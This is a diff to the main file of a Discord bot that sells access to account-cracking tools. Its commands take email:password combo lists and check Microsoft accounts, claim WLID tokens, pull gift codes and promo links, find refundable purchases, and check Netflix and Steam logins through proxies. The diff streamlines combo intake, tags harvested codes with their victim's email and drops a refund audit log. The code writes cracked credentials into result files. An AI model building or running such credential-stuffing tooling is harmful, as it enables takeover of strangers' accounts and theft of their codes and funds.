@@ -3,20 +3,18 @@
 //  Supports both slash commands and dot-prefix commands
 // ============================================================
 
-const { Client, GatewayIntentBits, Partials, ActionRowBuilder, ButtonBuilder, ButtonStyle, ComponentType } = require("discord.js");
+const { Client, GatewayIntentBits, Partials, ActionRowBuilder, ButtonBuilder, ButtonStyle, AttachmentBuilder } = require("discord.js");
 const config = require("./config");
-const { AuthManager, parseDuration, formatDuration, formatExpiry } = require("./utils/auth-manager");
+const { AuthManager, parseDuration, formatDuration } = require("./utils/auth-manager");
 const { ConcurrencyLimiter } = require("./utils/concurrency");
 const { OTPManager } = require("./utils/otp-manager");
 const { StatsManager } = require("./utils/stats-manager");
-const { sendToWebhook } = require("./utils/webhook");
 const { checkCodes } = require("./utils/microsoft-checker");
 const { claimWlids } = require("./utils/microsoft-claimer");
 const { pullCodes, pullLinks } = require("./utils/microsoft-puller");
 const { checkRefundAccounts } = require("./utils/microsoft-refund");
-
 const { checkInboxAccounts, getServiceCount } = require("./utils/microsoft-inbox");
-const { loadProxies, isProxyEnabled, getProxyCount, getProxyStats, reloadProxies } = require("./utils/proxy-manager");
+const { loadProxies, isProxyEnabled, getProxyCount, getProxyStats } = require("./utils/proxy-manager");
 const blacklist = require("./utils/blacklist");
 const { setWlids, getWlids, getWlidCount } = require("./utils/wlid-store");
 const { WelcomeStore } = require("./utils/welcome-store");
@@ -40,14 +38,11 @@ const {
   refundResultsEmbed,
   netflixProgressEmbed,
   netflixResultsEmbed,
-  netflixHitEmbed,
   steamProgressEmbed,
   steamResultsEmbed,
-  steamHitEmbed,
   errorEmbed,
   successEmbed,
   infoEmbed,
-  ownerOnlyEmbed,
   authListEmbed,
   helpOverviewEmbed,
   helpCategoryEmbed,
@@ -85,7 +80,8 @@ const gen = new GenManager();
 
 let webhookUrl = "";
 const activeAborts = new Map();
-const activeRecoverySessions = new Map(); // legacy, unused after recovery removal
+
+const MAX_COMBO_LINES = 4000;
 
 // ── Helpers ──────────────────────────────────────────────────
 
@@ -96,12 +92,12 @@ function isOwner(userId) {
 // ── Channel enforcement ──────────────────────────────────────
 
 const PULLER_CHECKER_CMDS = new Set(["pull", "promopuller", "check", "checker", "claim"]);
-const INBOX_NORMAL_CMDS = new Set(["inboxaio", "rewards", "recover", "captcha", "help", "stats", "search", "purchase", "changer", "wlidset", "refund", "netflix", "steam"]);
+const INBOX_NORMAL_CMDS = new Set(["inboxaio", "rewards", "help", "stats", "wlidset", "refund", "netflix", "steam"]);
 
 function getRequiredChannel(cmd) {
   if (PULLER_CHECKER_CMDS.has(cmd)) return config.ALLOWED_CHANNEL_PULLER;
   if (INBOX_NORMAL_CMDS.has(cmd)) return config.ALLOWED_CHANNEL_INBOX;
-  return null; // admin commands (auth, deauth, admin, etc.) work in either channel
+  return null;
 }
 
 function checkChannelAccess(channelId, cmd) {
@@ -114,83 +110,74 @@ function checkChannelAccess(channelId, cmd) {
 function canUse(userId) {
   if (blacklist.isBlacklisted(userId)) return false;
   const allowed = isOwner(userId) || auth.isAuthorized(userId);
-  if (allowed) otpManager.ensureAuthenticated(userId); // auto-session
+  if (allowed) otpManager.ensureAuthenticated(userId);
   return allowed;
 }
 
 /**
- * Send welcome embed on first command use (per session).
- * Returns true if welcome was sent (caller should continue normally).
+ * First-time welcome DM. Persisted across restarts via WelcomeStore.
  */
-async function sendWelcomeIfNeeded(respond, userId, username) {
-  if (welcomedUsers.has(userId)) return;
-  welcomedUsers.add(userId);
-  try {
-    await respond({ embeds: [welcomeEmbed(username)] });
-  } catch {}
+async function sendWelcomeIfNeeded(userId, username, userObj) {
+  if (welcomeStore.has(userId)) return;
+  welcomeStore.mark(userId);
+  try { await userObj.send({ embeds: [welcomeEmbed(username)] }); } catch {}
 }
-
-const MAX_COMBO_LINES = 4000;
 
 function splitInput(raw) {
   if (!raw) return [];
-  return raw
-    .split(/[\n,]+/)
-    .map((s) => s.trim())
-    .filter(Boolean);
+  return raw.split(/[\n,]+/).map((s) => s.trim()).filter(Boolean);
 }
 
 async function fetchAttachmentLines(attachment) {
-  if (!attachment) return [];
+  if (!attachment) return "";
   const res = await fetch(attachment.url);
-  const text = await res.text();
-  return text.split("\n").map((l) => l.trim()).filter(Boolean);
+  return await res.text();
+}
+
+/**
+ * Combine raw inline text + optional attachment, then extract clean email:password
+ * pairs. Caps at MAX_COMBO_LINES to prevent runaway jobs.
+ */
+async function gatherCombos(rawText, attachment) {
+  let buf = rawText || "";
+  if (attachment) {
+    const fileText = await fetchAttachmentLines(attachment);
+    buf += "\n" + fileText;
+  }
+  return extractCombos(buf, MAX_COMBO_LINES);
 }
 
 function stopButton(userId) {
   return new ActionRowBuilder().addComponents(
-    new ButtonBuilder()
-      .setCustomId(`stop_${userId}`)
-      .setLabel("Stop")
-      .setStyle(ButtonStyle.Secondary)
+    new ButtonBuilder().setCustomId(`stop_${userId}`).setLabel("Stop").setStyle(ButtonStyle.Secondary)
   );
 }
 
 async function updateProgress(msg, embed, userId) {
-  try {
-    await msg.edit({ embeds: [embed], components: [stopButton(userId)] });
-  } catch { /* ignore rate limits */ }
+  try { await msg.edit({ embeds: [embed], components: [stopButton(userId)] }); } catch {}
 }
 
-// ── WLID Set handler ────────────────────────────────────────
+// ── WLID Set ─────────────────────────────────────────────────
 
 async function handleWlidSet(respond, userId, wlidsRaw, wlidsFile) {
   if (!isOwner(userId)) return respond({ embeds: [errorEmbed("Only the bot owner can set WLIDs.")] });
-
   let wlids = splitInput(wlidsRaw);
   if (wlidsFile) {
-    const lines = await fetchAttachmentLines(wlidsFile);
-    wlids = wlids.concat(lines);
+    const text = await fetchAttachmentLines(wlidsFile);
+    wlids = wlids.concat(text.split("\n").map((l) => l.trim()).filter(Boolean));
   }
-
-  if (wlids.length === 0) return respond({ embeds: [errorEmbed("No WLID tokens provided. Paste them or attach a `.txt` file.")] });
-
+  if (wlids.length === 0) return respond({ embeds: [errorEmbed("No WLID tokens provided.")] });
   setWlids(wlids);
-  return respond({ embeds: [successEmbed(`WLID tokens updated. **${wlids.length}** tokens stored.\n\nPrevious tokens have been replaced.`)] });
+  return respond({ embeds: [successEmbed(`WLID tokens updated. **${wlids.length}** stored.`)] });
 }
 
-// ── Check handler ────────────────────────────────────────────
+// ── Check ────────────────────────────────────────────────────
 
 async function handleCheck(respond, userId, wlidsRaw, codesRaw, codesFile, threads = 10, dmUser = null) {
   if (!canUse(userId)) return respond({ embeds: [errorEmbed(blacklist.isBlacklisted(userId) ? "You are blacklisted." : "You are not authorized to use this bot.")] });
 
   const acquire = limiter.acquire(userId, "check");
-  if (!acquire.ok) {
-    const reason = acquire.reason === "busy"
-      ? "You already have a command running. Wait for it to finish."
-      : `Max concurrent users (${config.MAX_CONCURRENT_USERS}) reached. Try again later.`;
-    return respond({ embeds: [errorEmbed(reason)] });
-  }
+  if (!acquire.ok) return respond({ embeds: [errorEmbed(acquire.reason === "busy" ? "You already have a command running." : `Max concurrent users (${config.MAX_CONCURRENT_USERS}) reached.`)] });
 
   const ac = new AbortController();
   activeAborts.set(userId, ac);
@@ -198,13 +185,16 @@ async function handleCheck(respond, userId, wlidsRaw, codesRaw, codesFile, threa
   try {
     let wlids = splitInput(wlidsRaw);
     if (wlids.length === 0) wlids = getWlids();
-    
-    let codes = splitInput(codesRaw);
-    if (codesFile) codes = codes.concat(await fetchAttachmentLines(codesFile));
 
-    if (wlids.length === 0) return respond({ embeds: [errorEmbed("No WLID tokens provided and none stored.\nUse `/wlidset` or `.wlidset` to set WLIDs first, or provide them directly.")] });
-    if (codes.length === 0) return respond({ embeds: [errorEmbed("No codes provided. Use the `codes` option or attach a `.txt` file.")] });
-    if (codes.length > MAX_COMBO_LINES) return respond({ embeds: [errorEmbed(`Too many codes. Max ${MAX_COMBO_LINES} lines allowed.`)] });
+    let codes = splitInput(codesRaw);
+    if (codesFile) {
+      const text = await fetchAttachmentLines(codesFile);
+      codes = codes.concat(text.split("\n").map((l) => l.trim()).filter(Boolean));
+    }
+
+    if (wlids.length === 0) return respond({ embeds: [errorEmbed("No WLID tokens. Use `.wlidset` first.")] });
+    if (codes.length === 0) return respond({ embeds: [errorEmbed("No codes provided.")] });
+    if (codes.length > MAX_COMBO_LINES) codes = codes.slice(0, MAX_COMBO_LINES);
 
     const msg = await respond({
       embeds: [progressEmbed(0, codes.length, `Checking codes (${wlids.length} WLIDs)`)],
@@ -228,14 +218,10 @@ async function handleCheck(respond, userId, wlidsRaw, codesRaw, codesFile, threa
     const expired = results.filter((r) => r.status === "expired");
     const invalid = results.filter((r) => r.status === "invalid" || r.status === "error");
 
-    if (valid.length > 0)
-      files.push(textAttachment(valid.map((r) => (r.title ? `${r.code} | ${r.title}` : r.code)), "valid.txt"));
-    if (used.length > 0)
-      files.push(textAttachment(used.map((r) => r.code), "used.txt"));
-    if (expired.length > 0)
-      files.push(textAttachment(expired.map((r) => (r.title ? `${r.code} | ${r.title}` : r.code)), "expired.txt"));
-    if (invalid.length > 0)
-      files.push(textAttachment(invalid.map((r) => r.code), "invalid.txt"));
+    if (valid.length > 0) files.push(textAttachment(valid.map((r) => (r.title ? `${r.code} | ${r.title}` : r.code)), "valid.txt"));
+    if (used.length > 0) files.push(textAttachment(used.map((r) => r.code), "used.txt"));
+    if (expired.length > 0) files.push(textAttachment(expired.map((r) => (r.title ? `${r.code} | ${r.title}` : r.code)), "expired.txt"));
+    if (invalid.length > 0) files.push(textAttachment(invalid.map((r) => r.code), "invalid.txt"));
 
     const embed = checkResultsEmbed(results);
     if (stopped) embed.setTitle("Check Results (Stopped)");
@@ -258,31 +244,20 @@ async function handleCheck(respond, userId, wlidsRaw, codesRaw, codesFile, threa
   }
 }
 
-// ── Claim handler ────────────────────────────────────────────
+// ── Claim ────────────────────────────────────────────────────
 
 async function handleClaim(respond, userId, accountsRaw, accountsFile, threads = 5, dmUser = null) {
   if (!canUse(userId)) return respond({ embeds: [errorEmbed(blacklist.isBlacklisted(userId) ? "You are blacklisted." : "You are not authorized to use this bot.")] });
 
   const acquire = limiter.acquire(userId, "claim");
-  if (!acquire.ok) {
-    const reason = acquire.reason === "busy"
-      ? "You already have a command running. Wait for it to finish."
-      : `Max concurrent users (${config.MAX_CONCURRENT_USERS}) reached. Try again later.`;
-    return respond({ embeds: [errorEmbed(reason)] });
-  }
+  if (!acquire.ok) return respond({ embeds: [errorEmbed(acquire.reason === "busy" ? "You already have a command running." : `Max concurrent users (${config.MAX_CONCURRENT_USERS}) reached.`)] });
 
   const ac = new AbortController();
   activeAborts.set(userId, ac);
 
   try {
-    let accounts = splitInput(accountsRaw).filter((a) => a.includes(":"));
-    if (accountsFile) {
-      const lines = await fetchAttachmentLines(accountsFile);
-      accounts = accounts.concat(lines.filter((l) => l.includes(":")));
-    }
-
+    const accounts = await gatherCombos(accountsRaw, accountsFile);
     if (accounts.length === 0) return respond({ embeds: [errorEmbed("No valid accounts provided (email:password format).")] });
-    if (accounts.length > MAX_COMBO_LINES) return respond({ embeds: [errorEmbed(`Too many accounts. Max ${MAX_COMBO_LINES} lines allowed.`)] });
 
     const msg = await respond({
       embeds: [progressEmbed(0, accounts.length, "Claiming WLIDs")],
@@ -304,10 +279,8 @@ async function handleClaim(respond, userId, accountsRaw, accountsFile, threads =
     const success = results.filter((r) => r.success && r.token);
     const failed = results.filter((r) => !r.success);
 
-    if (success.length > 0)
-      files.push(textAttachment(success.map((r) => r.token), "tokens.txt"));
-    if (failed.length > 0)
-      files.push(textAttachment(failed.map((r) => `${r.email}: ${r.error || "Unknown error"}`), "failed.txt"));
+    if (success.length > 0) files.push(textAttachment(success.map((r) => r.token), "tokens.txt"));
+    if (failed.length > 0) files.push(textAttachment(failed.map((r) => `${r.email}: ${r.error || "Unknown"}`), "failed.txt"));
 
     const embed = claimResultsEmbed(results);
     if (stopped) embed.setTitle("Claim Results (Stopped)");
@@ -330,32 +303,21 @@ async function handleClaim(respond, userId, accountsRaw, accountsFile, threads =
   }
 }
 
-// ── Pull handler ─────────────────────────────────────────────
+// ── Pull ─────────────────────────────────────────────────────
 
 async function handlePull(respond, userId, accountsRaw, accountsFile, dmUser = null, username = null) {
   if (!canUse(userId)) return respond({ embeds: [errorEmbed(blacklist.isBlacklisted(userId) ? "You are blacklisted." : "You are not authorized to use this bot.")] });
 
   const acquire = limiter.acquire(userId, "pull");
-  if (!acquire.ok) {
-    const reason = acquire.reason === "busy"
-      ? "You already have a command running. Wait for it to finish."
-      : `Max concurrent users (${config.MAX_CONCURRENT_USERS}) reached. Try again later.`;
-    return respond({ embeds: [errorEmbed(reason)] });
-  }
+  if (!acquire.ok) return respond({ embeds: [errorEmbed(acquire.reason === "busy" ? "You already have a command running." : `Max concurrent users (${config.MAX_CONCURRENT_USERS}) reached.`)] });
 
   const ac = new AbortController();
   activeAborts.set(userId, ac);
   const startTime = Date.now();
 
   try {
-    let accounts = splitInput(accountsRaw).filter((a) => a.includes(":"));
-    if (accountsFile) {
-      const lines = await fetchAttachmentLines(accountsFile);
-      accounts = accounts.concat(lines.filter((l) => l.includes(":")));
-    }
-
+    const accounts = await gatherCombos(accountsRaw, accountsFile);
     if (accounts.length === 0) return respond({ embeds: [errorEmbed("No valid accounts provided (email:password format).")] });
-    if (accounts.length > MAX_COMBO_LINES) return respond({ embeds: [errorEmbed(`Too many accounts. Max ${MAX_COMBO_LINES} lines allowed.`)] });
 
     const msg = await respond({
       embeds: [pullFetchProgressEmbed({ done: 0, total: accounts.length, totalCodes: 0, working: 0, failed: 0, withCodes: 0, noCodes: 0, startTime, username })],
@@ -368,65 +330,34 @@ async function handlePull(respond, userId, accountsRaw, accountsFile, dmUser = n
     let lastAccount = "";
     let lastCodes = 0;
     let lastError = null;
-    let fetchWorking = 0;
-    let fetchFailed = 0;
-    let fetchWithCodes = 0;
-    let fetchNoCodes = 0;
+    let fetchWorking = 0, fetchFailed = 0, fetchWithCodes = 0, fetchNoCodes = 0;
     let fetchResultsRef = [];
     let validateCounts = {};
 
     const { fetchResults, validateResults } = await pullCodes(accounts, (phase, detail) => {
       const now = Date.now();
-
       if (phase === "fetch") {
         totalCodesSoFar += detail.codes;
         lastAccount = detail.email;
         lastCodes = detail.codes;
         lastError = detail.error;
-
-        if (detail.error) {
-          fetchFailed++;
-        } else {
-          fetchWorking++;
-          if (detail.codes > 0) fetchWithCodes++;
-          else fetchNoCodes++;
-        }
-
+        if (detail.error) fetchFailed++;
+        else { fetchWorking++; if (detail.codes > 0) fetchWithCodes++; else fetchNoCodes++; }
         if (now - lastUpdate > 2000) {
           lastUpdate = now;
           updateProgress(msg, pullFetchProgressEmbed({
-            done: detail.done,
-            total: detail.total,
-            totalCodes: totalCodesSoFar,
-            working: fetchWorking,
-            failed: fetchFailed,
-            withCodes: fetchWithCodes,
-            noCodes: fetchNoCodes,
-            lastAccount,
-            lastCodes,
-            lastError,
-            startTime,
-            username,
+            done: detail.done, total: detail.total, totalCodes: totalCodesSoFar,
+            working: fetchWorking, failed: fetchFailed, withCodes: fetchWithCodes, noCodes: fetchNoCodes,
+            lastAccount, lastCodes, lastError, startTime, username,
           }), userId);
         }
-      } else if (phase === "recheck_start") {
-        // PRS second phase — UI shows recheck message
-        updateProgress(msg, progressEmbed(0, detail.total, "Checking if no code is left..."), userId);
-      } else if (phase === "recheck") {
-        if (now - lastUpdate > 2000) {
-          lastUpdate = now;
-          updateProgress(msg, progressEmbed(detail.done, detail.total, "Checking if no code is left..."), userId);
-        }
       } else if (phase === "validate_start") {
-        // Capture fetch results for live display
         if (detail.fetchResults) fetchResultsRef = detail.fetchResults;
-        // Recount totalCodes from fetchResults after PRS merge
         totalCodesSoFar = fetchResultsRef.reduce((sum, r) => sum + r.codes.length, 0);
         validateCounts = { done: 0, total: detail.total, valid: 0, used: 0, balance: 0, expired: 0, regionLocked: 0, invalid: 0 };
         updateProgress(msg, pullLiveProgressEmbed(fetchResultsRef, validateCounts, { username, startTime }), userId);
       } else if (phase === "validate") {
         validateCounts.done = detail.done;
-        // Update counts from detail if available
         if (detail.status) {
           if (detail.status === "valid") validateCounts.valid++;
           else if (detail.status === "used" || detail.status === "REDEEMED") validateCounts.used++;
@@ -450,20 +381,18 @@ async function handlePull(respond, userId, accountsRaw, accountsFile, dmUser = n
     const expired = validateResults.filter((r) => r.status === "expired");
     const invalid = validateResults.filter((r) => r.status === "invalid" || r.status === "error");
 
-    if (valid.length > 0)
-      files.push(textAttachment(valid.map((r) => (r.title ? `${r.code} | ${r.title}` : r.code)), "valid.txt"));
-    if (used.length > 0)
-      files.push(textAttachment(used.map((r) => r.code), "used.txt"));
-    if (expired.length > 0)
-      files.push(textAttachment(expired.map((r) => (r.title ? `${r.code} | ${r.title}` : r.code)), "expired.txt"));
-    if (invalid.length > 0)
-      files.push(textAttachment(invalid.map((r) => r.code), "invalid.txt"));
+    // Format codes WITH source account so user knows where each came from
+    const fmt = (r) => {
+      const base = r.title ? `${r.code} | ${r.title}` : r.code;
+      return r.sourceEmail ? `${base} | from ${r.sourceEmail}` : base;
+    };
 
-    const embed = pullResultsEmbed(fetchResults, validateResults, {
-      elapsed,
-      dmSent: !!dmUser,
-      username: username || undefined,
-    });
+    if (valid.length > 0) files.push(textAttachment(valid.map(fmt), "valid.txt"));
+    if (used.length > 0) files.push(textAttachment(used.map(fmt), "used.txt"));
+    if (expired.length > 0) files.push(textAttachment(expired.map(fmt), "expired.txt"));
+    if (invalid.length > 0) files.push(textAttachment(invalid.map(fmt), "invalid.txt"));
+
+    const embed = pullResultsEmbed(fetchResults, validateResults, { elapsed, dmSent: !!dmUser, username: username || undefined });
     if (stopped) embed.setDescription(embed.data.description + "\n\n*Stopped -- partial results*");
 
     if (dmUser) {
@@ -484,32 +413,21 @@ async function handlePull(respond, userId, accountsRaw, accountsFile, dmUser = n
   }
 }
 
-// ── PromoPuller handler ──────────────────────────────────────
+// ── PromoPuller ──────────────────────────────────────────────
 
 async function handlePromoPuller(respond, userId, accountsRaw, accountsFile, dmUser = null, username = null) {
   if (!canUse(userId)) return respond({ embeds: [errorEmbed(blacklist.isBlacklisted(userId) ? "You are blacklisted." : "You are not authorized to use this bot.")] });
 
   const acquire = limiter.acquire(userId, "promopuller");
-  if (!acquire.ok) {
-    const reason = acquire.reason === "busy"
-      ? "You already have a command running. Wait for it to finish."
-      : `Max concurrent users (${config.MAX_CONCURRENT_USERS}) reached. Try again later.`;
-    return respond({ embeds: [errorEmbed(reason)] });
-  }
+  if (!acquire.ok) return respond({ embeds: [errorEmbed(acquire.reason === "busy" ? "You already have a command running." : `Max concurrent users (${config.MAX_CONCURRENT_USERS}) reached.`)] });
 
   const ac = new AbortController();
   activeAborts.set(userId, ac);
   const startTime = Date.now();
 
   try {
-    let accounts = splitInput(accountsRaw).filter((a) => a.includes(":"));
-    if (accountsFile) {
-      const lines = await fetchAttachmentLines(accountsFile);
-      accounts = accounts.concat(lines.filter((l) => l.includes(":")));
-    }
-
+    const accounts = await gatherCombos(accountsRaw, accountsFile);
     if (accounts.length === 0) return respond({ embeds: [errorEmbed("No valid accounts provided (email:password format).")] });
-    if (accounts.length > MAX_COMBO_LINES) return respond({ embeds: [errorEmbed(`Too many accounts. Max ${MAX_COMBO_LINES} lines allowed.`)] });
 
     const msg = await respond({
       embeds: [promoPullerFetchProgressEmbed({ done: 0, total: accounts.length, totalLinks: 0, working: 0, failed: 0, withLinks: 0, noLinks: 0, startTime, username })],
@@ -519,46 +437,22 @@ async function handlePromoPuller(respond, userId, accountsRaw, accountsFile, dmU
 
     let lastUpdate = Date.now();
     let totalLinksSoFar = 0;
-    let lastAccount = "";
-    let lastLinks = 0;
-    let lastError = null;
-    let fetchWorking = 0;
-    let fetchFailed = 0;
-    let fetchWithLinks = 0;
-    let fetchNoLinks = 0;
+    let lastAccount = "", lastLinks = 0, lastError = null;
+    let fetchWorking = 0, fetchFailed = 0, fetchWithLinks = 0, fetchNoLinks = 0;
 
     const { fetchResults, allLinks } = await pullLinks(accounts, (phase, detail) => {
       const now = Date.now();
-
       if (phase === "fetch") {
         totalLinksSoFar += detail.links;
-        lastAccount = detail.email;
-        lastLinks = detail.links;
-        lastError = detail.error;
-
-        if (detail.error) {
-          fetchFailed++;
-        } else {
-          fetchWorking++;
-          if (detail.links > 0) fetchWithLinks++;
-          else fetchNoLinks++;
-        }
-
+        lastAccount = detail.email; lastLinks = detail.links; lastError = detail.error;
+        if (detail.error) fetchFailed++;
+        else { fetchWorking++; if (detail.links > 0) fetchWithLinks++; else fetchNoLinks++; }
         if (now - lastUpdate > 2000) {
           lastUpdate = now;
           updateProgress(msg, promoPullerFetchProgressEmbed({
-            done: detail.done,
-            total: detail.total,
-            totalLinks: totalLinksSoFar,
-            working: fetchWorking,
-            failed: fetchFailed,
-            withLinks: fetchWithLinks,
-            noLinks: fetchNoLinks,
-            lastAccount,
-            lastLinks,
-            lastError,
-            startTime,
-            username,
+            done: detail.done, total: detail.total, totalLinks: totalLinksSoFar,
+            working: fetchWorking, failed: fetchFailed, withLinks: fetchWithLinks, noLinks: fetchNoLinks,
+            lastAccount, lastLinks, lastError, startTime, username,
           }), userId);
         }
       }
@@ -567,31 +461,28 @@ async function handlePromoPuller(respond, userId, accountsRaw, accountsFile, dmU
     const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
     const stopped = ac.signal.aborted;
     const files = [];
-    const uniqueLinks = [...new Set(allLinks)];
+    // allLinks is now [{ link, sourceEmail }] — keep raw + per-account breakdown
+    const flatLinks = allLinks.map((l) => typeof l === "string" ? l : l.link);
+    const uniqueLinks = [...new Set(flatLinks)];
 
-    if (allLinks.length > 0)
-      files.push(textAttachment(allLinks, "links_all.txt"));
-    if (uniqueLinks.length > 0 && uniqueLinks.length !== allLinks.length)
+    if (allLinks.length > 0) {
+      files.push(textAttachment(allLinks.map((l) => typeof l === "string" ? l : `${l.link} | from ${l.sourceEmail}`), "links_all.txt"));
+    }
+    if (uniqueLinks.length > 0 && uniqueLinks.length !== flatLinks.length) {
       files.push(textAttachment(uniqueLinks, "links_unique.txt"));
-
-    // Per-account breakdown
+    }
     const perAccount = fetchResults
       .filter((r) => !r.error && r.links.length > 0)
       .map((r) => `${r.email}\n${r.links.join("\n")}`);
-    if (perAccount.length > 0)
-      files.push(textAttachment(perAccount, "links_by_account.txt"));
+    if (perAccount.length > 0) files.push(textAttachment(perAccount, "links_by_account.txt"));
 
-    const embed = promoPullerResultsEmbed(fetchResults, allLinks, {
-      elapsed,
-      dmSent: !!dmUser,
-      username: username || undefined,
-    });
+    const embed = promoPullerResultsEmbed(fetchResults, flatLinks, { elapsed, dmSent: !!dmUser, username: username || undefined });
     if (stopped) embed.setDescription(embed.data.description + "\n\n*Stopped -- partial results*");
 
     if (dmUser) {
       try {
         await dmUser.send({ embeds: [embed], files });
-        await msg.edit({ embeds: [promoPullerResultsEmbed(fetchResults, allLinks, { elapsed, dmSent: true, username: username || undefined })], components: [] });
+        await msg.edit({ embeds: [promoPullerResultsEmbed(fetchResults, flatLinks, { elapsed, dmSent: true, username: username || undefined })], components: [] });
       } catch {
         await msg.edit({ embeds: [embed], files, components: [] });
       }
@@ -606,32 +497,21 @@ async function handlePromoPuller(respond, userId, accountsRaw, accountsFile, dmU
   }
 }
 
-// ── Refund handler ───────────────────────────────────────────
+// ── Refund ───────────────────────────────────────────────────
 
 async function handleRefund(respond, userId, accountsRaw, accountsFile, threads = 5, dmUser = null, username = null) {
   if (!canUse(userId)) return respond({ embeds: [errorEmbed(blacklist.isBlacklisted(userId) ? "You are blacklisted." : "You are not authorized to use this bot.")] });
 
   const acquire = limiter.acquire(userId, "refund");
-  if (!acquire.ok) {
-    const reason = acquire.reason === "busy"
-      ? "You already have a command running. Wait for it to finish."
-      : `Max concurrent users (${config.MAX_CONCURRENT_USERS}) reached. Try again later.`;
-    return respond({ embeds: [errorEmbed(reason)] });
-  }
+  if (!acquire.ok) return respond({ embeds: [errorEmbed(acquire.reason === "busy" ? "You already have a command running." : `Max concurrent users (${config.MAX_CONCURRENT_USERS}) reached.`)] });
 
   const ac = new AbortController();
   activeAborts.set(userId, ac);
   const startTime = Date.now();
 
   try {
-    let accounts = splitInput(accountsRaw).filter((a) => a.includes(":"));
-    if (accountsFile) {
-      const lines = await fetchAttachmentLines(accountsFile);
-      accounts = accounts.concat(lines.filter((l) => l.includes(":")));
-    }
-
-    if (accounts.length === 0) return respond({ embeds: [errorEmbed("No valid accounts provided (email:password format).")] });
-    if (accounts.length > MAX_COMBO_LINES) return respond({ embeds: [errorEmbed(`Too many accounts. Max ${MAX_COMBO_LINES} lines allowed.`)] });
+    const accounts = await gatherCombos(accountsRaw, accountsFile);
+    if (accounts.length === 0) return respond({ embeds: [errorEmbed("No valid accounts provided.")] });
 
     const msg = await respond({
       embeds: [refundProgressEmbed({ done: 0, total: accounts.length, hits: 0, noRefund: 0, locked: 0, failed: 0, startTime, username })],
@@ -647,46 +527,34 @@ async function handleRefund(respond, userId, accountsRaw, accountsFile, threads 
       else if (status === "free") noRefund++;
       else if (status === "locked") locked++;
       else failed++;
-
       const now = Date.now();
       if (now - lastUpdate > 2000) {
         lastUpdate = now;
         const lastEmail = results.length > 0 ? results[results.length - 1]?.user : "";
-        updateProgress(msg, refundProgressEmbed({
-          done, total, hits, noRefund, locked, failed,
-          lastAccount: lastEmail, startTime, username,
-        }), userId);
+        updateProgress(msg, refundProgressEmbed({ done, total, hits, noRefund, locked, failed, lastAccount: lastEmail, startTime, username }), userId);
       }
     }, ac.signal);
 
     const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
     const stopped = ac.signal.aborted;
     const files = [];
-
-    const hitResults = results.filter(r => r.status === "hit");
-    const noRefundResults = results.filter(r => r.status === "free");
-    const lockedResults = results.filter(r => r.status === "locked");
-    const failedResults = results.filter(r => r.status === "fail");
+    const hitResults = results.filter((r) => r.status === "hit");
+    const noRefundResults = results.filter((r) => r.status === "free");
+    const lockedResults = results.filter((r) => r.status === "locked");
+    const failedResults = results.filter((r) => r.status === "fail");
 
     if (hitResults.length > 0) {
-      const lines = hitResults.map(r => {
-        const items = (r.refundable || []).map(i => `  ${i.title} | ${i.date} | ${i.days_ago}d ago | ${i.amount}`).join("\n");
+      const lines = hitResults.map((r) => {
+        const items = (r.refundable || []).map((i) => `  ${i.title} | ${i.date} | ${i.days_ago}d ago | ${i.amount}`).join("\n");
         return `${r.user}:${r.password}\n${items}`;
       });
       files.push(textAttachment(lines, "Refundable.txt"));
     }
-    if (noRefundResults.length > 0)
-      files.push(textAttachment(noRefundResults.map(r => `${r.user}:${r.password}`), "No_Refund.txt"));
-    if (lockedResults.length > 0)
-      files.push(textAttachment(lockedResults.map(r => `${r.user}:${r.password} | ${r.detail}`), "Locked.txt"));
-    if (failedResults.length > 0)
-      files.push(textAttachment(failedResults.map(r => `${r.user}:${r.password} | ${r.detail}`), "Failed.txt"));
+    if (noRefundResults.length > 0) files.push(textAttachment(noRefundResults.map((r) => `${r.user}:${r.password}`), "No_Refund.txt"));
+    if (lockedResults.length > 0) files.push(textAttachment(lockedResults.map((r) => `${r.user}:${r.password} | ${r.detail}`), "Locked.txt"));
+    if (failedResults.length > 0) files.push(textAttachment(failedResults.map((r) => `${r.user}:${r.password} | ${r.detail}`), "Failed.txt"));
 
-    // Log every refund check
-    for (const r of results) {
-      console.log(`[REFUND] User=${userId} Account=${r.user} Status=${r.status} Items=${r.refundable?.length || 0} Time=${new Date().toISOString()}`);
-      statsManager.record(userId, "refund", r.status === "hit" || r.status === "free");
-    }
+    for (const r of results) statsManager.record(userId, "refund", r.status === "hit" || r.status === "free");
 
     const embed = refundResultsEmbed(results, { elapsed, dmSent: !!dmUser, username: username || undefined });
     if (stopped) embed.setDescription(embed.data.description + "\n\n*Stopped -- partial results*");
@@ -709,12 +577,12 @@ async function handleRefund(respond, userId, accountsRaw, accountsFile, threads 
   }
 }
 
+// ── Auth + Blacklist + Stats ─────────────────────────────────
+
 async function handleAuth(respond, callerId, targetId, durationStr) {
   if (!isOwner(callerId)) return respond({ embeds: [errorEmbed("Only the bot owner can authorize users.")] });
-
   const ms = parseDuration(durationStr);
   if (ms === null) return respond({ embeds: [errorEmbed(`Invalid duration: \`${durationStr}\`\nExamples: 1h, 7d, 30d, 1mo, forever`)] });
-
   auth.authorize(targetId, ms, callerId);
   const durLabel = ms === Infinity ? "Permanent" : formatDuration(ms);
   return respond({ embeds: [successEmbed(`<@${targetId}> has been authorized for **${durLabel}**.`)] });
@@ -727,40 +595,30 @@ async function handleDeauth(respond, callerId, targetId) {
 }
 
 async function handleAuthList(respond) {
-  const entries = auth.getAllAuthorized();
-  return respond({ embeds: [authListEmbed(entries)] });
+  return respond({ embeds: [authListEmbed(auth.getAllAuthorized())] });
 }
 
 async function handleStats(respond) {
-  const activeCount = limiter.getActiveCount();
-  const authCount = auth.getAllAuthorized().length;
-  const wlidCount = getWlidCount();
-  const blCount = blacklist.getCount();
   const proxyStatus = isProxyEnabled() ? `Enabled (${getProxyCount()} loaded)` : "Disabled";
   const ps = getProxyStats();
   const proxyLine = isProxyEnabled()
     ? `Proxies: \`${proxyStatus}\`\nProxy requests: \`${ps.total}\` (${ps.successRate}% success)`
     : `Proxies: \`${proxyStatus}\``;
-
   return respond({
     embeds: [
-      infoEmbed(
-        "Bot Status",
-        [
-          `Active sessions: \`${activeCount}/${config.MAX_CONCURRENT_USERS}\``,
-          `Authorized users: \`${authCount}\``,
-          `Blacklisted users: \`${blCount}\``,
-          `Stored WLIDs: \`${wlidCount}\``,
-          proxyLine,
-          `Uptime: \`${formatUptime(process.uptime())}\``,
-          `Ping: \`${client.ws.ping}ms\``,
-        ].join("\n")
-      ),
+      infoEmbed("Bot Status", [
